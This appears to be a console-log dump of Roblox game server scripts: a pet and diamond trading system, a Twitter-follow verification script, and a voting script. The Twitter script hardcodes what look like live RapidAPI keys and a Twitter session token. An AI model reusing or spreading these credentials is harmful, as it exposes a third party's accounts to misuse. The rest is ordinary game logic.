			local pet, oplyr = _L.Pets.Get(tostring(v))
			if not (pet and oplyr == plyr and tostring(pet.uid) == tostring(v)) then
				PleaseStopTrade = "A pet was invalid for " .. tostring(plyr.Name)
				return
			end
			local NewTab = {}
			for i,v in pairs(pet) do
				local m = tostring(i)
			--	if WL[m] then
					NewTab[m] = v
			--	end
			end
			table.insert(C_PETS[numb], NewTab)
		end
	end


	ConvertPets(trade.sender, 1)
	ConvertPets(trade.target, 2)

	local function CheckSlots(plyr, numb, oppNumb)
		-- TODO: CHECK IF WILL DELETE FINAL PET
		local s = _L.Saving.Get(plyr)
		if not s then
			PleaseStopTrade = "No statistics for " .. tostring(plyr.Name)
			return
		end
		local offers = FigureOutOfferString(plyr)
		if not offers and tostring(offers) ~= "nil" then
			PleaseStopTrade = "Could not figure out offer string for " .. tostring(plyr.Name)
			return
		end
		local Hash = #C_PETS[numb]
		if #s.Pets - #C_PETS[oppNumb] < 1 then
			NeedSlots = true
		end
		if Hash > 0 then
			if (#s.Pets + Hash) > s.MaxSlots then
				NeedSlots = true
			end
		end
	end

	-- CHECK SLOTS
	CheckSlots(trade.sender, 2, 1)
	CheckSlots(trade.target, 1, 2)

	if PleaseStopTrade then
		ForceStopTrade(id, "PROCESSING: " .. tostring(PleaseStopTrade))
		return
	end
	if NeedSlots then
		if not SayNah() then
			ForceStopTrade(id, "Something went wrong while fixing trade")
			return
		else
			return
		end
	end

	local NeedStopDiamondTrade = false
	local function CheckGems(plyr, numb)
		-- TODO: CHECK IF WILL DELETE FINAL PET
		local s = _L.Saving.Get(plyr)
		if (not s) or (not s.Diamonds) then
			PleaseStopTrade = "No statistics for " .. tostring(plyr.Name)
			return
		end
		local offers = FigureOutOfferString(plyr)
		if not offers and tostring(offers) ~= "nil" then
			PleaseStopTrade = "Could not figure out offer string for " .. tostring(plyr.Name)
			return
		end
		if (s.Diamonds + DiamondsFrame[numb]) > _L.Directory.Currency["Diamonds"].Limit then
			NeedStopDiamondTrade = true
		end
	end

	-- CHECK SLOTS
	CheckGems(trade.sender, 2)
	CheckGems(trade.target, 1)


	if PleaseStopTrade then
		ForceStopTrade(id, "PROCESSING: " .. tostring(PleaseStopTrade))
		return
	end
	if NeedStopDiamondTrade then
		if not SayNah("One player does not have enough space for more diamonds") then
			ForceStopTrade(id, "Something went wrong while fixing DIAMONDS")
			return
		else
			return
		end
	end

	if PleaseStopTrade then
		ForceStopTrade(id, "PROCESSING: " .. tostring(PleaseStopTrade))
		return
	end

	-- GIVE THE ITEMS AFTER A FINAL CHECK --
	-- TODO: HERE
	local trade = Get(id)
	if not trade then
		return
	end
	if not CheckTrade(id) then
		ForceStopTrade(id, "PROCESSING: Something went wrong while checking the trade session")
		return
	end

	CheckSlots(trade.sender, 2, 1)
	CheckSlots(trade.target, 1, 2)

	if NeedSlots then
		ForceStopTrade(id, "Need more slots [last check]")
		return
	end

	local function TakeGems(plyr, numb)
		local s = _L.Saving.Get(plyr)
		if not s then
			PleaseStopTrade = "No save for plyr DURING DIAMOND CHECK"
			return
		end
		local o = FigureOutOfferString(plyr)
		if not (o and trade[o]) then
			PleaseStopTrade = "Invalid offer string during diamond check"
			return
		end
		if s.Diamonds < trade[o].diamonds then
			PleaseStopTrade = "Lacks diamonds"
			return
		end
		s.Diamonds = s.Diamonds - math.clamp(trade[o].diamonds, 0, 99999999999999999999999999999)
		return true
	end


	if not TakeGems(trade.sender, 1) then
		ForceStopTrade(id, tostring(PleaseStopTrade or "Diamond take failure"))
		return
	end
	if not TakeGems(trade.target, 2) then
		ForceStopTrade(id, tostring(PleaseStopTrade  or "Diamond take failure"))
		return
	end
	if PleaseStopTrade then
		ForceStopTrade(id, tostring(PleaseStopTrade))
		return
	end
	if (not trade.sender) or (not trade.target) then
		return
	end

	-- TODO: TAKE AWAY PETS HERE
	local TakeFailure
	local function Delete(plyr, numb)
		if not _L.Saving.Get(plyr) then
			PleaseStopTrade = "NO SAVE 3"
			return
		end
		for i,v in pairs(C_PETS[numb]) do
			if not v.uid then
				warn("NO UID")
				TakeFailure = true
				break
			end
			if not _L.Pets.Delete(v.uid) then
				TakeFailure = true
				break
			end
		end
	end
	Delete(trade.sender, 1)
	if PleaseStopTrade then
		ForceStopTrade(id, tostring(PleaseStopTrade))
		return
	end
	Delete(trade.target, 2)
	if PleaseStopTrade then
		ForceStopTrade(id, tostring(PleaseStopTrade))
		return
	end

	if TakeFailure then
		ForceStopTrade(id, "Unfortunately, a pet failed to delete. No pets will be refunded (to prevent duping) 😢")
		return
	end

	--------------------------------------------------------------------------------
	local domonds 
	if DiamondsFrame[1] ~= -1 and DiamondsFrame[2] ~= -1 and PleaseStopTrade == nil and C_PETS[1] ~= -1 and C_PETS[2] ~= -1 then
		local function GiveDiamondsToPlyr(plyr, numb)
			coroutine.wrap(function()
				local success , err = pcall(function()
					local s = _L.Saving.Get(plyr)
					s.Diamonds = s.Diamonds + math.clamp(DiamondsFrame[numb], 0, _L.Directory.Currency["Diamonds"].Limit)
					domonds = math.clamp(DiamondsFrame[numb], 0, _L.Directory.Currency["Diamonds"].Limit)
				end)
				if not success then
					warn("CRITICAL: " .. tostring(err))
				end
			end)()
		end
		GiveDiamondsToPlyr(trade.sender, 2)
		GiveDiamondsToPlyr(trade.target, 1)
        
        local function history(plyr, isSender) -- @localonex
            --[[
                TODO: update plyrs trading history
                
                data set example:
                
                   save.TradeHistory2 = {
                {
                    u = otherPlyr.UserId,
                    ts = os.time(),
                    p = yourPets,
                    pn = #yourPets,
                    op = otherPets,
                    opn = #otherPets,
                    d = yourDiamonds,
                    od = otherDiamonds,
                    t = 0
                }

            }
            --]]
            
            local save = _L.Saving.Get(plyr)
            if not save then
                ForceStopTrade(id, "Failed to get a plyrs save :(")
                return
            end
            
            local otherPlyr = isSender == true and trade.target or trade.sender
            if not otherPlyr then
                ForceStopTrade(id, "Failed to get a plyrs data :(")
                return
            end
            
            local numb = isSender and 1 or 2
            local otherNumb = isSender and 2 or 1
            local yourPets = C_PETS[numb]
            local otherPets = C_PETS[otherNumb]
            local otherPetsN = #otherPets
            local yourDiamonds = DiamondsFrame[numb]
            local otherDiamonds = DiamondsFrame[otherNumb]
            if not yourPets or not otherPets or not otherPetsN or not yourDiamonds or not otherDiamonds then
                ForceStopTrade(id, "Something went wrong :(")
                return
            end
            
            table.insert(save.TradeHistory2, {
                u = otherPlyr.UserId,
                ts = os.time(),
                p = yourPets,
                pn = #yourPets,
                op = otherPets,
                opn = #otherPets,
                d = yourDiamonds,
                od = otherDiamonds,
                t = 0
            })
        end
        
        history(trade.sender, true)
        history(trade.target, false)
        
		-- CHECK FOR DUPLICATE IDS
		local RegisteredIds = {}
		local FoundDuplicate

		local function CheckForDupes(numb)
			for i,v in pairs(C_PETS[numb]) do
				if not v.uid then
					warn("NO UID")
					PleaseStopTrade = "NO UID"
					break
				end
				if RegisteredIds[tostring(v.uid)] then
					FoundDuplicate = true
					break
				end
				RegisteredIds[tostring(v.uid)] = true
			end
		end
		CheckForDupes(1)
		CheckForDupes(2)
		if FoundDuplicate then
			ForceStopTrade(id, "Unfortunately, a pet duplicated. No pets will be refunded (to prevent duping) 😢")
			return
		end
		if PleaseStopTrade then
			ForceStopTrade(id, PleaseStopTrade)
			return
		end

		if (not trade.sender) or (not trade.target) then
			return
		end

		local function GivePetsToPlyr(plyr, oppositeNumber, regularNumber)
			coroutine.wrap(function()

				local s , e = pcall(function()
					for i,v in pairs(C_PETS[oppositeNumber]) do
						-- TODO: GIVE
						if v and type(v) == "table" and v.id and v.uid then
							_L.Pets.Create(plyr, tostring(v.id), v, nil, true)
						else
							warn("no id")
						end
					end
				end)
				if not s then
					warn("CRITICAL : " .. tostring(e))
				end

				--_G.CantJoinPlaza[tostring(plyr.UserId)] = true
				local saveStatus = _L.Saving.Save(plyr)
				if not saveStatus then
					wait(2)
					warn("Save failed for " .. tostring(plyr.UserId) .. ", trying again.")
					if not _L.Saving.Save(plyr) then
						warn("Save failed twice for " .. tostring(plyr.UserId))
					end
				end
				--_G.CantJoinPlaza[tostring(plyr.UserId)] = nil
			end)()
		end
		GivePetsToPlyr(trade.sender, 2, 1)
		GivePetsToPlyr(trade.target, 1, 2)


		local function Follow(plyr, oppositeNumber)
			coroutine.wrap(function()
				for i,v in pairs(C_PETS[oppositeNumber]) do
					if v.uid then
						_L.Signal.Fire("Force Change Target", v.uid)
					end
				end
			end)()
		end
		Follow(trade.sender, 2)
		Follow(trade.target, 1)

		SendPartners(id, "Trade Processed", function()
			trades[tostring(id)] = nil
		end, true)
		trades[tostring(id)] = nil

		return true
	else
		ForceStopTrade(id, "Something went wrong while giving currencies to plyrs")
		return
	end
	--------------------------------------------------------------------------------

end -- ends here



local function CheckProcessingState(id)
	local trade = Get(id)
	if not trade then
		return
	end
	
	if trade.senderReady and trade.targetReady then
		if not trade.confirmStage then
			trade.confirmStage = true
		end
	else
		trade.confirmStage = false
	end
	
	if trade.senderConfirmed and trade.targetConfirmed then
		coroutine.wrap(function()
			local tme = os.clock()
			local timeExpired = false
			if not SafelyUpdate(id) then
				return
			end
			while true do
				if not Get(id) then
					break
				end
				if not (trade.senderConfirmed and trade.targetConfirmed) then
					break
				end
				if not CheckTrade(id) then
					break
				end
				if os.clock() - tme > 4 then
					timeExpired = true
					break
				end
				_L.Heartbeat(3)
			end
			if not SafelyUpdate(id) then
				return
			end
			if timeExpired then
				-- final check
				local t = Get(id)
				if not t then
					return
				end
				if not (trade.senderConfirmed and trade.targetConfirmed) then
					return
				end
				if not CheckTrade(id) then	
					return
				end
				trade.processing = true
				trade.confirmTick = workspace:GetServerTimeNow()
				-- Process it
				ProcessTrade(tostring(id))
			end
		end)()
	end
end

_L.Network.Invoked("Ready Trade").OnInvoke = function(plyr, f, counter)
	local s = _L.Saving.Get(plyr)
	if not s then
		return false, "Could not find save for player. This is crucial"
	end
	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant ready up!"
	end
	local trade, id = GetByPlyr(plyr)
	if tostring(id) ~= f then
		return false, "IDs were not the same"
	end
	if not trade or not id then
		return false, "Could not identify trade"
	end
	--[[if workspace:GetServerTimeNow() - counter > 0 then
		return false, "Time left.."
	end]]--
	warn()
	local str = FigureOutSenderData(plyr)
	if not str then
		return false, "Sender data was not valid"
	end
	local ss = str .. "Ready"
	if trade[ss] then
		return false, "You are already readied!"
	end
	trade[ss] = true
	if not SafelyUpdate(id) then
		return false, "Could not safely update"
	end
	CheckProcessingState(id)
	return true
end

_L.Network.Invoked("Confirm Trade").OnInvoke = function(plyr, f, counter)
	local s = _L.Saving.Get(plyr)
	if not s then
		return false, "Could not find save for player. This is crucial"
	end
	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant ready up!"
	end
	local trade, id = GetByPlyr(plyr)
	if tostring(id) ~= f then
		return false, "IDs were not the same"
	end
	if not trade or not id then
		return false, "Could not identify trade"
	end
	
	local str = FigureOutSenderData(plyr)
	if not str then
		return false, "Sender data was not valid"
	end
	local ss = str .. "Confirmed"
	if trade[ss] then
		return false, "You are already confirmed!"
	end
	trade[ss] = true
	if not SafelyUpdate(id) then
		return false, "Could not safely update"
	end
	CheckProcessingState(id)
	return true
end

_L.Network.Invoked("Unready Trade").OnInvoke = function(plyr, f, counter)
	local s = _L.Saving.Get(plyr)
	if not s then
		return false, "Could not find save for player. This is crucial"
	end
	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant unconfirm!"
	end
	local trade, id = GetByPlyr(plyr)
	if tostring(id) ~= f then
		return false, "IDs were not the same"
	end
	if not trade or not id then
		return false, "Could not identify trade"
	end
	local str = FigureOutSenderData(plyr)
	if not str then
		return false, "Sender data was not valid"
	end
	local ss = str .. "Confirm"
	if not trade[ss] then
		return false, "You are already unconfirmed!"
	end
	trade[ss] = false
	if not SafelyUpdate(id) then
		return false, "Could not safely update"
	end
	return true
end

_L.Network.Invoked("Unready Trade").OnInvoke = function(plyr, f, counter)
	local s = _L.Saving.Get(plyr)
	if not s then
		return false, "Could not find save for player. This is crucial"
	end
	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant unready!"
	end
	local trade, id = GetByPlyr(plyr)
	if tostring(id) ~= f then
		return false, "IDs were not the same"
	end
	if not trade or not id then
		return false, "Could not identify trade"
	end
	local str = FigureOutSenderData(plyr)
	if not str then
		return false, "Sender data was not valid"
	end
	local ss = str .. "Ready"
	if not trade[ss] then
		return false, "You are already unreadied!"
	end
	trade[ss] = false
	if not SafelyUpdate(id) then
		return false, "Could not safely update"
	end
	return true
end


_L.Signal.Fired("Pet Deleted"):connect(function(petId, plyr)
	local trade, id = GetByPlyr(plyr)
	if trade and not trade.isProcess then
		local Figured = FigureOutOfferString(plyr)
		if not (Figured and trade[Figured]) then
			ForceStopTrade(id, "Could not figure out trading")
			return
		end
		local x 
		pcall(function()
			x =tostring(plyr.Name)
		end)
		ForceStopTrade(id, "Forcibly stopped trade because " .. x .. " had a pet removed")
	end
end)

_L.Signal.Fired("Stat Changed"):connect(function(plyr, stat)
	if stat == "Diamonds" or stat == "RobuxSpent" or stat == "OwnsTradingPlaza" then
		local trade, id = GetByPlyr(plyr)
		if trade then
			local s = _L.Saving.Get(plyr)
			if not (s and s.Diamonds) then
				ForceStopTrade(tostring(id), "No save for one plyr")
				return
			end
			local Figured = FigureOutOfferString(plyr)
			if not (Figured and trade[Figured]) then
				ForceStopTrade(id, "Could not figure out trading")
				return
			end
			if trade[Figured].diamonds > s.Diamonds then
				trade[Figured].diamonds = s.Diamonds
				if not SafelyUpdate(id) then
					ForceStopTrade(id, "Could not safely update diamonds")
					return
				end
			end
		end
	end
end)

local Invites = {}
local C = {}

_L.Signal.Fired("Player Added"):connect(function(plyr)
	Invites[tostring(plyr.UserId)] = {}
	C[tostring(plyr.UserId)] = {}
end)

game.Players.PlayerRemoving:Connect(function(plyr)
	Invites[tostring(plyr.UserId)] = nil
end)

_L.Network.Invoked("Get Invites Open").OnInvoke = function(plyr)
	return Invites[tostring(plyr.UserId)]
end


_L.Network.Invoked("Send Trade Invite").OnInvoke = function(plyr, plyr2)
	local s = _L.Saving.Get(plyr)

	if not s then
		return false, "No file"
	end
	if not s.PickedStarter then
		return false, "You need a starter pet first"
	end
	if #s.Pets < 1 then
		return false, "You need a pet"
	end

	local abc2 = os.clock() - Plyr_Info[tostring(plyr.UserId)][1]

	if not GetTradingTimer(plyr) then
		return false, tostring(plyr.Name).. " needs wait ".. tostring(math.clamp(math.round(60-abc2), 0, 60)) .." seconds before trading."
	end

	local s2 = _L.Saving.Get(plyr2)
	if not s2 then
		return false, "No file for other player"
	end

	local abc = os.clock() - Plyr_Info[tostring(plyr2.UserId)][1]	
	if not GetTradingTimer(plyr2) then
		return false, tostring(plyr2.Name).. " needs wait ".. tostring(math.clamp(math.round(60-abc), 0, 60)) .." seconds before trading."
	end

	if not (s2.Settings and s2.Settings.Trading) then
		return false, "???"
	end
	if Get(plyr2) then
		return false, "This player is currently in a trade"
	end
	if not s2.PickedStarter then
		return false, "This player has no starter"
	end
	if #s2.Pets < 1 then
		return false, "The other player needs a pet"
	end
	if C[tostring(plyr.UserId)][tostring(plyr2.UserId)] and os.clock() - C[tostring(plyr.UserId)][tostring(plyr2.UserId)] < 15 then
		return false, "Please do not send too many requests to this player."
	end

	C[tostring(plyr.UserId)][tostring(plyr2.UserId)] = os.clock()

	if (s2.Settings.Trading == 1) or (not _G.Friends[tostring(plyr2.UserId)]) or (s2.Settings.Trading == 2 and _G.Friends[tostring(plyr2.UserId)] and _L.Functions.SearchArray(_G.Friends[tostring(plyr2.UserId)], plyr.UserId)) then
		Invites[tostring(plyr.UserId)][tostring(plyr2.UserId)] = true

		_L.Network.Fire("Update Trade Invites Open", plyr, Invites[tostring(plyr.UserId)])

		task.spawn(function()
			local o = os.clock()
			_L.Network.Fire("Trade Recieved", plyr2, plyr2, {sender = plyr})
			
			--local success = _L.Network.Invoke("Trade Recieved2", plyr2, plyr)
			--if success then
				_L.Network.Fired("Accept Trade Invite"):Connect(function()
					task.spawn(function()
						if plyr and plyr.Parent and plyr2 and plyr2.Parent then

							if os.clock() - o > 20 then
								return
							end

							if not CheckBro(plyr) then
								return
							end

							if not CheckBro(plyr2) then
								return
							end

							if Get(plyr2) then
								return
							end

							if GetTradingTimer(plyr2) ~= true or GetTradingTimer(plyr) ~= true then
								return
							end

							local ss = _L.Saving.Get(plyr)
							if not (ss and ss.Settings and ss.Settings.Trading) then
								return
							end
							if Get(plyr) then
								return
							end
							if (ss.Settings.Trading ~= 2) or (ss.Settings.Trading == 2 and _G.Friends and _G.Friends[tostring(plyr2.UserId)] and _L.Functions.SearchArray(_G.Friends[tostring(plyr2.UserId)], plyr.UserId)) then
								Initialize(plyr, plyr2)
							end
						end
					end)
				end);
				if plyr and plyr.Parent then
					Invites[tostring(plyr.UserId)][tostring(plyr2.UserId)] = nil
					_L.Network.Fire("Update Trade Invites Open", plyr, Invites[tostring(plyr.UserId)])
				end
			--end
		end)
		return true
	else
		return false, "You can't trade this player."
	end
end

-- idk
_L.Network.Fired("Ignore Trade"):Connect(function(player, plyr)
	--local trade, id = GetByPlyr(plyr)
	--[[print(trade, id)
	
	local otherPlayer = nil
	local isSender = false
	if trade.sender == player then
		otherPlayer  = trade.target.Name
		isSender = true
	else
		otherPlayer  = trade.sender.Name
	end]]--
	
	--print(trade,id,plyr,player)
	--if trade and id then
	--	ForceStopTrade(tostring(id), "Ignored")
		_L.Network.Fire("Trade Ignored", plyr, player)
	--end
end)

_L.Network.Invoked("Cancel Trade").OnInvoke = function(player, data)
	if data.processing == true then
		return false, 'already processing'
	end
	
	local trade, id = GetByPlyr(player)
	if not trade or not id then
		return false, "error"
	end

	if not (Plyr_Info[tostring(player.UserId)] and Plyr_Info[tostring(player.UserId)][2]) then
		return false, "You cant do actions"
	end
	
	local f, OTHER = FigureOutDetails(player, id)
	SendPartners(id, "Trade Cancelled", function()
		if not (Plyr_Info[tostring(player.UserId)] and Plyr_Info[tostring(player.UserId)][2]) then
			return
		end
		ForceStopTrade(id, false)
	end, id, OTHER or {DisplayName = "???"})
	return true
end

_L.Signal.Fired("Server Closing"):connect(function()
	for i,v in pairs(trades) do
		if not v.processing then
			ForceStopTrade(tostring(i), "Server closing")
		end
	end
end)
_L.Signal.Fired("Save Fail"):connect(function(player)
	local trade, id = GetByPlyr(player)
	if trade and id then
		ForceStopTrade(tostring(id), "One player failed to save")
	end
end)

while true do
	for i, _ in pairs(trades) do
		if not CheckTrade(i) then
			ForceStopTrade(i, "A player that was in the trade is now unavailable")
		end
	end
	_L.Heartbeat(2)
end

   -  Editar
  04:54:13.772    -  Editar
  04:54:13.773  ----- [2347] ServerScriptService.Scripts.Game.Twitter -----  -  Editar
  04:54:13.773  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

--------|    Variables    |--------
local twtterSession = "H4sIACWWnmQC/42RS4+iQBSFjY46LtoQERGfzaOgaXpBikJLusW/UhTUK9MbQ68mzH8fURdOMsnMXd3F+c49997XOo89cBiDPEOn+se5JoKXheSyEJJzSZTkqln4fLPtG9FUjqxOJIxwSfUZPGy3owVYB/Wv86PJ2EHQRaD1GoBssnzfG3xKlyfuPmuy39U3Xrz62IWzXhBsF9ognicURpOMtzZZeuX2K9731ZENrb0/DSKmbQA0w3zdWVgOM0ZMIv/73LK7LdIOzl0cxQDn1wV0FLvIPWt/K3MUaf6tXVmT0EZdY0Z26+16dxgilXJ2OIqMfVGj921lslDrrJ0E6Yd+t+dOcMdegjCfDdCL5RpJBVD5bs+cbGCYA1WabZYUBRiiMU6vh9SEYUxMXRiaTolgrQAeMTqBsefdJDKWcakUaqTkacMETBpZllXDq4RWVZnGlCQPWJzesATBAiVINdWewoZdqklSuW844yqBkikOaYvtPOSAPz7LeFGIqhCkJEKISl3N8zzD6CJ4vQO3IQH5ohoRShHCeEklpxWpigdfnF4COf8r/YjdDAF82v0DsJHr5Kf4eH/oPczTBRmTrufNU6Yy3Bva+OezANOXUPv8fKrrt7ff2AZGtMgCAAA="
local ApiKey = "ae0a229527msh547e77082112303p1740d7jsn9f96c4dad488" --"59d5fc1a75msh7370598af0bd658p193c62jsnaecbf4980331"
local host = "https://twittrapi.p.rapidapi.com"
local TwitterUsername = "BIGCopies"
local ApliLink = host.."/user-following?username="
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local function getFollowers(Handle)
    local cursor
    local morepages
    
    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = ApliLink..Handle,
            Method = "GET",
            Headers = {
                ["twttr-session"] = twtterSession,
                ["X-RapidAPI-Key"] = ApiKey,
                ["X-RapidAPI-Host"] = "twttrapi.p.prapidapi.com"
            }
        })
    end)
    
    if not success then
        return false, "Failed to make a request."
    end
    
    local data = HttpService:JSONDecode(response.Body)
    
    if data.errors then
        return false, "User not found on Twitter"
    end
    
    if not data.data or not data.data.user then
        return false, "Twitter Servers are busy. Please try again later."
    end
    
    for _, entry in pairs(data.data.user.timeline_response.timeline.instructions) do
        if entry["__typename"] == "TimelineAddEntries" then
            for _, userdata in pairs(entry.entries) do
                local content = userdata.content
                local typename = content["__typename"]
                
                if typename == "TimelineTimelineItem" then
                    local result = content.content.userResult.result
                    local typenameUser = result["__typename"]
                    
                    if typenameUser == "User" then
                        local foundusername = result.legacy.screen_name
                        
                        if foundusername == TwitterUsername then
                            return true, morepages, cursor
                        end
                    end
                end
                
                if typename == "TimelineTimelineCursor" and content["cursoreType"] == "Bottom" then
                    cursor = content["value"]
                    morepages = string.sub(cursor, 1, 1) ~= "0"
                end
            end
        end
    end
    
    return false, morepages, cursor
end

function json()
	
end

local database = _L.DataStoreService:GetDataStore("twitter:".._L.Settings.StatsVersion)
local function checkIfAlreadyUsed(Handle)
    local data = nil
    local success, output = pcall(function()
        data = database:GetAsync(TwitterUsername)
	end)
	
	data = _L.HttpService:JSONDecode(data)
    
    if not success then
        return nil
    end    
    if success and data == nil then
        data = {}
    end
    
    if table.find(data, Handle) then
        return true
    end
    
    return false
end

local function updateAlreadyUsed(Handle)
    --if not checkIfAlreadyUsed(Handle) then        
    local data = nil
    local success, output = pcall(function()
        data = database:GetAsync(TwitterUsername)
    end)        

    if not success then
        return false
    end
    if success and data == nil then
        data = {}
    end

	table.insert(data, Handle)
	
	data = _L.HttpService:JSONEncode(data)
    local success, output = pcall(function()
        database:SetAsync(TwitterUsername, data)
    end)
    if not success then
        return false, "Error"..output
    end
    return true 

end

local de = {}
_L.Network.Invoked("Verify Twitter").OnInvoke = function(plyr, Handle)
    if de[plyr] and de[plyr] - os.time() > 5 then
        return false, "You are doing this too fast."
    end
    de[plyr] = os.time()
    
    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end
    
    if save.IsFollowingOnTwitter == true then
        return false, "You have already verified your twitter!"
    end
    
    local isFound, messageOrMorePages, cursor = getFollowers(Handle)
    
    if not isFound and type(messageOrMorePages) == "string" then
        return false, messageOrMorePages
    end
    
    local isUsed = checkIfAlreadyUsed(Handle)
    if isUsed == nil then
        return false, "Something went wrong try again!"
    elseif isUsed == true then
        return false, "Twtter account already used!"
    end
    
    while messageOrMorePages and not isFound and cursor do
        wait(1)
        isFound,messageOrMorePages,cursor = getFollowers(Handle.."&cursor="..(cursor or ""))
    end
    
    if isFound then
        local update, e = updateAlreadyUsed(Handle)
        if not update then
            return false, e or "Something went wrong try again!"
        end
        
        save.IsFollowingOnTwitter = true
        save.TwitterUsername = Handle
        
        return true
    end
    
    return false, "Could not verify. Try again later!"
end  -  Editar
  04:54:13.773    -  Editar
  04:54:13.773  ----- [2348] ServerScriptService.Scripts.Game.Voting -----  -  Editar
  04:54:13.773  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local DS = _L.DataStoreService:GetDataStore("BIGVotes".._L.FFlags.Get("GlobalVoteKey") or "1")

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function CreateProfile(player)
	local success, response = pcall(function()
		return DS:SetAsync(player.UserId, _L.HttpService:JSONEncode(_G.GetDefaultData("vote")))
	end)
	
	if not success then
		print("FAILED TO CREATE PLAYER PROFILE")
		return nil
	end
	
	return _G.GetDefaultData("vote")
end

function GetPlayer(player)
	local success, response = pcall(function()
		return DS:GetAsync(player.UserId)
	end)
	
	if not success then
		return nil
	end
	
	response = response and _L.HttpService:JSONDecode(response) or nil
	if not response then
		return CreateProfile(player)
	end
	
	return response
end

function UpdatePlayer(player, new)
	local success = pcall(function()
		DS:UpdateAsync(player.UserId, function(old)
			old = _L.HttpService:JSONDecode(old)
			print(old)
			for i, v in pairs(new) do
				pcall(function()
					old[i] = v
				end)
			end
			old = _L.HttpService:JSONEncode(old)
			print(old)
			return old
		end)
	end)
	
	if not success then
		print("FAILED TO SAVE PLAYER")
	end
end

function Message(...)
	_L.Network.Fire("Message", ...)
end

function Vote(player, vote)
	vote = vote or false
	
	local pData = GetPlayer(player)
	if not pData then
		return Message(player,'Failed to vote, Try again!')
	end
	
	if pData.PlayerVote ~= nil then
		return Message(player, 'You have already voted!')
	end
	
	pData.PlayerVote = vote
	Message(player, "Vote received! Thank you so much! :)")
	
	UpdatePlayer(player, pData)
	UpdateClient(player)
end

function UpdateClient(player)
	local Data = GetPlayer(player)
	_L.Network.Fire("Update Vote Signs", player, {
		PlayerVote = Data.PlayerVote,
		Vote = _L.FFlags.Get("GlobalVote") or ""
	})
end

_L.Signal.Fired("Player Added"):Connect(function(player)
	_G.HasLoaded(player)
	UpdateClient(player)
end)
_L.Network.Fired("Submit Vote"):Connect(Vote)

_L.Signal.Fired("FFlags Changed"):Connect(function()
	for i, v in ipairs(_L.Players:GetPlayers()) do
		UpdateClient(v)
	end
